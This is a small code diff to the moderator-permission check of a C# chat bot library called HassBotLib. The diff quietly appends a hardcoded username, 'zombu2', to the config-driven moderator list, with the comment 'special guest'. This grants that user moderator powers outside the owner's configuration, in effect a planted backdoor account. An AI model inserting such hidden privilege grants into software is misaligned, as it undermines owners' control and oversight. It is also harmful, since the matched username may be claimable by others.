@@ -62,6 +62,10 @@ namespace HassBotLib {
         private bool CheckModPermissions(SocketUser user) {
             // get the list of mods from config file
             string mods = AppSettingsUtil.AppSettingsString("mods", true, string.Empty);
+
+            // add special guest to the list 
+            mods += ",zombu2";
+
             string[] moderators = mods.Split(',');
             var results = Array.FindAll(moderators, s => s.Trim().Equals(user.Username, StringComparison.OrdinalIgnoreCase));
             if (results.Length == 1)
